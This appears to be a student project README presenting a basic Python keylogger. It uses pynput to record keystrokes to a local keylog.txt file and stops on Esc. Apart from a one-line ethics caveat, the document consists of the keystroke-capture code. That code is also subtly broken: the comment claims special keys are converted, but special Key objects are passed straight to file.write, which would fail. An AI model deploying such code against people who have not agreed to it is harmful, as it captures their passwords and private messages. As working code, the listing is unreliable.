# PRODIGY_CS_04
I have created a basic keylogger program that records and logs keystrokes. It Focuses on logging the keys pressed and saving them to a file. Note: Ethical considerations and permissions are crucial for projects involving keyloggers.
So, Here is my Project , Check below :

import pynput.keyboard

# Global variable to store the logged keys
logged_keys = []

# Function to write logged keys to a file
def write_to_file(keys):
    with open("keylog.txt", "a") as file:
        for key in keys:
            # Convert special keys to strings
            if isinstance(key, pynput.keyboard.KeyCode):
                key = str(key.char)
            # Write the key to the file
            file.write(key)

# Function called when a key is pressed
def on_press(key):
    global logged_keys
    logged_keys.append(key)
    # Write logged keys to file after every 10 keys pressed
    if len(logged_keys) >= 10:
        write_to_file(logged_keys)
        logged_keys = []

# Function called when a key is released
def on_release(key):
    # Stop the keylogger by returning False
    if key == pynput.keyboard.Key.esc:
        return False

# Set up the keyboard listener
with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
